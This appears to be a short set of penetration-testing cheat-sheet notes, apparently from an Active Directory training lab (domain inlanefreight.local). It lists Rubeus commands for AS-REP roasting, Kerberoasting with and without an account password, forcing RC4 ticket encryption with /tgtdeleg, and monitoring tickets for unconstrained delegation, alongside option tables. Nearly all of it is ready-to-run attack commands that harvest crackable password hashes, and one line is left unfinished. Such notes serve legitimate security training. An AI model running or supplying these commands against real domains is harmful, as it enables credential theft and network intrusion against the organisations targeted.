### AS-REPRoasting
```powershell
Rubeus.exe asreproast /format:hashcat # Enumeration
Rubeus.exe asreproast /user:Target.user /domain:inlanefreight.local /dc:dc01.inlanefreight.local /nowrap /outfile:hashes.txt # Attack
```

---
### kerberosting
```
Rubeus.exe kerberoast /nowrap
```

| Option                         | Description                                                                                                                                                                                                                                                                                                                                                                                                                                                               |
| ------------------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `/outfile:filename.txt`        | write the result to a file.                                                                                                                                                                                                                                                                                                                                                                                                                                               |
| `/pwdsetafter` `/pwdsetbefore` | Kerberoast accounts whose password was set within a particular date                                                                                                                                                                                                                                                                                                                                                                                                       |
| `/stats`                       | list statistics about Kerberoastable accounts without sending any ticket requests. This can be useful for gathering information and checking the types of encryption the account tickets use.                                                                                                                                                                                                                                                                             |
| `/tgtdeleg`                    | useful for us in situations where we find accounts with the options `This account supports Kerberos AES 128-bit encryption` or `This account supports Kerberos AES 256-bit encryption` set, meaning that when we perform a Kerberoast attack, we will get a `AES-128 (type 17)` or `AES-256 (type 18)` TGS tickets back which can be significantly more difficult to crack than `RC4 (type 23)` tickets. we can use `/tgtdeleg` flag with Rubeus to force RC4 encryption. |
#### Kerberoasting without an Account Password
```batch
Rubeus.exe createnetonly /program:cmd.exe /show
Rubeus.exe kerberoast REM Error we need 
Rubeus.exe kerberoast /nopreauth:amber.smith /domain:inlanefreight.local /spn:MSSQLSvc/SQL01:1433 /nowrap
```
**Note:** Instead of `/spn` we can use `/spns:listofspn.txt` to try multiple SPNs.

| Option          | Description                                   |
| --------------- | --------------------------------------------- |
| `createnetonly` | utilize its CMD window to perform the attack. |

---

### Uncostrained delegation
```
.\Rubeus.exe monitor /interval:5 /nowrap
```